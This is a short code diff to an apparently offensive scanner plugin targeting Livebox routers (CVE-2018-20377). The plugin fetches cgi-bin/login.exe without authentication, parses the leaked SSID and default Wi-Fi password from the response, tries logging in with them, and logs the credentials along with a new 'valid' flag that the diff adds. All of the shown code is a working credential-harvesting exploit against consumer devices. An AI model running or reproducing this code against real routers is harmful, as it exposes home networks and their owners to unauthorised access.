@@ -91,9 +91,10 @@ class Plugin(IPlugin):
 		if 'livebox' in res.text:
 			cred_page = requests.get('{}/{}'.format(res.url,'cgi-bin/login.exe'), allow_redirects=True, verify=False, timeout=5)
 			if cred_page and cred_page.status_code == 200:
-					arr = cred_page.text.split('\n')
-					ssid = arr[2][:-4]
-					password = arr[3][:-4]
-					log.info("Found SSID and default passwd for {} -> {}:{} ".format(res.url,ssid, password))
-					if try_auth(res.url) or try_auth(res.url, password):
-						log.info("plugin=livebox-20377 device={} SSID={} password={}".format(res.url, ssid, password))
+				arr = cred_page.text.split('\n')
+				ssid = arr[2][:-4]
+				password = arr[3][:-4]
+				valid = False
+				if try_auth(res.url) or try_auth(res.url, password):
+					valid = True
+				log.info("plugin=livebox-20377 device={} SSID={} password={} valid={}".format(res.url, ssid, password, valid))
